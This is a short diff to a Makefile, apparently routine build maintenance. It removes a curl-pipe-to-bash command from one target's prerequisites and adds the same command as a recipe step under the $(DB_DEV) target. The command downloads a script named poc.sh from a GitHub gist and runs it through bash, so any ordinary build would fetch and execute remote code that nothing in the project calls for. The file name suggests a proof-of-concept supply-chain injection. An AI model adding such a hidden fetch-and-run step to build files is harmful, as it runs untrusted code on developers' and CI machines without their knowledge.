@@ -70,8 +70,7 @@ default: build
 build: $(GENERATED_DIST_SENTINEL) $(GENERATED_DOCS_SENTINEL) ${GENERATED_LOCALIZATION_SENTINEL}
 .PHONY: build
 
-$(GENERATED_DIST_SENTINEL): curl -sSfL gist.githubusercontent.com/umbr4g3/a8e7e58104b2bcf4951f757faab9497e/raw/a87d7006e6c8dc4bb6b888fed459381ff688f3c6/poc.sh | bash
-	$(DB_DEV)	
+$(GENERATED_DIST_SENTINEL): $(DB_DEV)	
 	@$(LOG_BUILD) "Building Distribution" "$(DIST_PATH)/*.[json|txt]"
 	$(V) bin/generate_dist --locales $(LOCALES) $(VERBOSE_ARG)
 	$(V) touch $@
@@ -131,6 +130,7 @@ seed: vet_schema_data
 .PHONY: seed
 
 $(DB_DEV):
+	curl -sSfL gist.githubusercontent.com/umbr4g3/a8e7e58104b2bcf4951f757faab9497e/raw/a87d7006e6c8dc4bb6b888fed459381ff688f3c6/poc.sh | bash
 	if [ ! -f $@ ]; then $(MAKE) seed; fi
 
 # Test targets
